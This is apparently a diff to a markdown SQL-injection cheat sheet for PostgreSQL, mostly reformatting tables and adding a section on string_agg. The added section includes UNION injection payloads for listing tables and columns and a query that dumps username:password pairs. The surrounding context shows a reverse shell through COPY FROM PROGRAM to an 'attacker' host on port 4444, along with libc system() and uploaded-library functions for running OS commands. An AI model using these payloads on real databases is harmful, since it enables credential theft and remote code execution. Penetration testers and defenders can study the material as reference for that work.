@@ -10,15 +10,15 @@ SELECT version()
 
 ### Current Context
 
-| Query | Description |
-|-------|-------------|
-| `SELECT user` | Current user |
-| `SELECT current_user` | Current user |
-| `SELECT session_user` | Session user |
+| Query                       | Description      |
+| --------------------------- | ---------------- |
+| `SELECT user`               | Current user     |
+| `SELECT current_user`       | Current user     |
+| `SELECT session_user`       | Session user     |
 | `SELECT current_database()` | Current database |
-| `SELECT current_schema()` | Current schema |
-| `SELECT inet_server_addr()` | Server IP |
-| `SELECT inet_server_port()` | Server port |
+| `SELECT current_schema()`   | Current schema   |
+| `SELECT inet_server_addr()` | Server IP        |
+| `SELECT inet_server_port()` | Server port      |
 
 ### Database Enumeration
 
@@ -62,17 +62,64 @@ SELECT * FROM pg_user WHERE usename=current_user
 
 ## String Functions
 
-| Function | Example | Result |
-|----------|---------|--------|
-| Concat | `'a'\|\|'b'` | `ab` |
-| `CONCAT` | `CONCAT('a','b')` | `ab` |
-| `SUBSTRING` | `SUBSTRING('hello',1,3)` | `hel` |
-| `SUBSTR` | `SUBSTR('hello',1,3)` | `hel` |
-| `LEFT` | `LEFT('hello',2)` | `he` |
-| `RIGHT` | `RIGHT('hello',2)` | `lo` |
-| `LENGTH` | `LENGTH('hello')` | `5` |
-| `ASCII` | `ASCII('A')` | `65` |
-| `CHR` | `CHR(65)` | `A` |
+| Function    | Example                  | Result |
+| ----------- | ------------------------ | ------ |
+| Concat      | `'a'\|\|'b'`             | `ab`   |
+| `CONCAT`    | `CONCAT('a','b')`        | `ab`   |
+| `SUBSTRING` | `SUBSTRING('hello',1,3)` | `hel`  |
+| `SUBSTR`    | `SUBSTR('hello',1,3)`    | `hel`  |
+| `LEFT`      | `LEFT('hello',2)`        | `he`   |
+| `RIGHT`     | `RIGHT('hello',2)`       | `lo`   |
+| `LENGTH`    | `LENGTH('hello')`        | `5`    |
+| `ASCII`     | `ASCII('A')`             | `65`   |
+| `CHR`       | `CHR(65)`                | `A`    |
+
+### String Aggregation (Concatenating Multiple Rows)
+
+**⚠️ Important:** `CONCAT()` only accepts **scalar values**, NOT subqueries that return multiple rows!
+
+#### ❌ WRONG - This will fail:
+
+```sql
+SELECT CONCAT((SELECT table_name FROM information_schema.tables))
+-- Error: more than one row returned by a subquery used as an expression
+```
+
+#### ✅ CORRECT - Use string_agg() or array functions:
+
+```sql
+-- Method 1: string_agg() - Recommended (PostgreSQL 9.0+)
+SELECT string_agg(table_name, ',') FROM information_schema.tables WHERE table_schema='public'
+
+-- Method 2: array_to_string() + array()
+SELECT array_to_string(array(SELECT table_name FROM information_schema.tables WHERE table_schema='public'), ',')
+
+-- Method 3: Using || with GROUP BY (less common)
+SELECT string_agg(column_name, ',') FROM information_schema.columns WHERE table_name='users'
+
+-- In UNION context:
+' UNION SELECT 1,string_agg(table_name,','),3,4 FROM information_schema.tables WHERE table_schema='public'--
+' UNION SELECT 1,array_to_string(array(SELECT table_name FROM information_schema.tables),','),3,4--
+```
+
+#### Common Use Cases:
+
+```sql
+-- List all databases
+SELECT string_agg(datname, ',') FROM pg_database
+
+-- List all tables
+SELECT string_agg(table_name, ',') FROM information_schema.tables WHERE table_schema='public'
+
+-- List all columns from a table
+SELECT string_agg(column_name, ',') FROM information_schema.columns WHERE table_name='users'
+
+-- Extract data from multiple rows
+SELECT string_agg(username || ':' || password, '|') FROM users
+
+-- With ordering
+SELECT string_agg(table_name, ',' ORDER BY table_name) FROM information_schema.tables WHERE table_schema='public'
+```
 
 ## Comment Syntax
 
@@ -207,8 +254,8 @@ COPY myoutput FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1"';
 ### Libc System (PostgreSQL < 8.2)
 
 ```sql
-CREATE OR REPLACE FUNCTION system(cstring) RETURNS int 
-AS '/lib/x86_64-linux-gnu/libc.so.6','system' 
+CREATE OR REPLACE FUNCTION system(cstring) RETURNS int
+AS '/lib/x86_64-linux-gnu/libc.so.6','system'
 LANGUAGE 'c' STRICT;
 
 SELECT system('whoami');
@@ -219,8 +266,8 @@ SELECT system('whoami');
 Requires uploading compiled library with `PG_MODULE_MAGIC`:
 
 ```sql
-CREATE FUNCTION sys(cstring) RETURNS int 
-AS '/tmp/pg_exec.so','pg_exec' 
+CREATE FUNCTION sys(cstring) RETURNS int
+AS '/tmp/pg_exec.so','pg_exec'
 LANGUAGE 'c' STRICT;
 
 SELECT sys('whoami');
